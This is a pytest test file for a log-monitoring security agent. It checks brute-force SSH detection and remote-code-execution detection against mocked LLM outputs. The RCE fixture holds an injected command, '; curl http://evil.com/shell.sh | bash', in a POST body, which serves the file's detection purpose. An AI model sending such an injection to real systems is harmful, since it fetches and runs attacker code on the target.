import pytest
from unittest.mock import patch, MagicMock
from agents.log_monitor import LogMonitorAgent
from schemas.outputs import Severity


# ── Fixtures ────────────────────────────────────────────────
@pytest.fixture
def agent():
    return LogMonitorAgent()


BRUTE_FORCE_LOG = """
Jan 15 02:31:01 server sshd[1234]: Failed password for root from 192.168.1.100 port 58392 ssh2
Jan 15 02:31:05 server sshd[1235]: Failed password for root from 192.168.1.100 port 58393 ssh2
Jan 15 02:31:09 server sshd[1236]: Failed password for admin from 192.168.1.100 port 58394 ssh2
Jan 15 02:31:12 server sshd[1237]: Failed password for root from 192.168.1.100 port 58395 ssh2
Jan 15 02:31:15 server sshd[1238]: Failed password for ubuntu from 192.168.1.100 port 58396 ssh2
"""

RCE_LOG = """
POST /api/execute HTTP/1.1
Host: target.com
Content-Type: application/json
{"command": "; curl http://evil.com/shell.sh | bash"}
"""


# ── Tests ───────────────────────────────────────────────────
class TestLogMonitorAgent:

    @patch("langchain.agents.AgentExecutor.invoke")
    def test_brute_force_detection(self, mock_invoke, agent):
        mock_invoke.return_value = {
            "output": """{"alert_type":"brute_force","severity":"HIGH",
                "source_ip":"192.168.1.100","timestamp":"2024-01-15T02:31:15",
                "affected_service":"sshd","confidence_score":0.92,
                "mitre_tactic":"Credential Access","mitre_technique":"T1110.001",
                "raw_evidence":["15 failed SSH attempts in 60s"]}"""
        }
        state = {"input_type": "log", "input_data": BRUTE_FORCE_LOG, "log_alerts": []}
        result = agent.run(state)
        alert = result["log_alerts"][0]
        assert alert["alert_type"] == "brute_force"
        assert alert["severity"] == "HIGH"
        assert alert["confidence_score"] > 0.85
        assert alert["source_ip"] == "192.168.1.100"

    @patch("langchain.agents.AgentExecutor.invoke")
    def test_rce_detection_escalates_to_critical(self, mock_invoke, agent):
        mock_invoke.return_value = {
            "output": """{"alert_type":"rce","severity":"CRITICAL",
                "source_ip":"10.0.0.5","timestamp":"2024-01-15T10:00:00",
                "affected_service":"api","confidence_score":0.97,
                "mitre_tactic":"Execution","mitre_technique":"T1059.004",
                "raw_evidence":["curl pipe to bash detected in POST body"]}"""
        }
        state = {"input_type": "log", "input_data": RCE_LOG, "log_alerts": []}
        result = agent.run(state)
        assert result["severity_level"] == "CRITICAL"

    @patch("langchain.agents.AgentExecutor.invoke")
    def test_empty_log_returns_no_alert(self, mock_invoke, agent):
        mock_invoke.return_value = {"output": "No threats detected."}
        state = {"input_type": "log", "input_data": "", "log_alerts": []}
        # Should handle gracefully — no exception
        try:
            result = agent.run(state)
            assert "log_alerts" in result
        except Exception as e:
            pytest.fail(f"Empty log raised exception: {e}")
